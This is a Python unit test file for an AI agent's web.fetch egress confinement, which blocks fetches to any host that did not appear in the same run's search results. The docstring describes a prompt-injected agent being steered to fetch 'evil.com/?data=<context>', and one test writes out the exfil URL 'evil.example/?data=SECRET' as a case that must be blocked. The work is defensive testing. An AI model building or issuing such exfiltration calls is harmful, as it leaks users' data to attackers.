"""web.fetch egress confinement: an agent may only fetch hosts that surfaced
in the same run's web.search results — the defense against a prompt-injected
agent (e.g. the scheduled scholarship scout) being steered to
`web.fetch evil.com/?data=<context>` for exfiltration.

These are unit tests of the two pure helpers plus the run-scoped policy; the
end-to-end enforcement point is agent_runner._execute.
"""
from __future__ import annotations

from backend.services.agent_runner import _host_of, _fetch_host_allowed


def test_host_extraction():
    assert _host_of("https://Scholarships.com/list?x=1") == "scholarships.com"
    assert _host_of("http://fastweb.com:8080/a") == "fastweb.com"
    assert _host_of("not a url") == ""
    assert _host_of("") == ""


def test_fetch_allowed_only_for_searched_hosts():
    seen = {"scholarships.com", "fastweb.com"}
    # a host that came back from search → allowed
    assert _fetch_host_allowed("https://scholarships.com/aid", seen) is True
    # the classic exfil URL the model was injected to build → blocked
    assert _fetch_host_allowed("https://evil.example/?data=SECRET", seen) is False
    # empty allowlist (no search ran yet) → nothing may be fetched
    assert _fetch_host_allowed("https://scholarships.com/aid", set()) is False
    # unparseable target → blocked
    assert _fetch_host_allowed("", seen) is False


def test_subdomain_is_not_silently_widened():
    # exact-host policy: a fetch to a DIFFERENT host than searched is blocked,
    # even a sibling subdomain — fail safe, never fail open.
    seen = {"www.scholarships.com"}
    assert _fetch_host_allowed("https://api.scholarships.com/x", seen) is False
